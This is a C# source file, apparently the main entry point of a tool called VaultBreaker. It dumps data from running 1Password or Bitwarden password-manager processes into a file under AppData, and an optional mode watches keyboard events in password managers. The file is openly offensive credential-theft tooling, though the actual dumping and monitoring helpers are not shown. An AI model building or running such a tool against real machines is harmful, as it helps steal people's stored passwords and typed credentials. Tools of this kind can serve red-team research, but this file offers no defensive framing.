using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using VaultBreaker.Helpers;
using VaultBreaker.Core;
using System.Runtime.Caching;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.IO;

namespace VaultBreaker
{
	class VaultBreaker
	{
		static void Main(string[] args)
		{
			var local = false;
			var monitor = false;
			var managerType = "1Password";
			var outFile = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
			var inFile = ""; 
			var cache = MemoryCache.Default.PhysicalMemoryLimit;
			//Command Line Options
			//Local Flag allowing the processing of a memory dump from the local machine.


			//Get Processes
			if (monitor)
			{
				DebugFunctions.writeDebug("Monitor set to true, monitoring for keyboard events in password managers.");
				Monitoring.Start();
			}

			if (local)
			{

			}
			else
			{
				switch (managerType.ToLower())
				{
					case "bitwarden":
						Console.WriteLine("[DEBUG]: Writing output to {0}", outFile);
						Console.WriteLine("Checking for Bitwarden Executables. Press Any key to continue.");
						Console.ReadKey();
						BitWarden.dumpBitwarden2(outFile);
						Console.ReadKey();
						break;
					case "1password":
						Console.WriteLine("[DEBUG]: Writing output to {0}", outFile);
						Console.WriteLine("Checking for 1Password Executables. Press Any key to continue.");
						Console.ReadKey();
						_1Password.dumpBitwarden2(outFile);
						break;
					default:
						break;
				}
			}
		}



	}
}
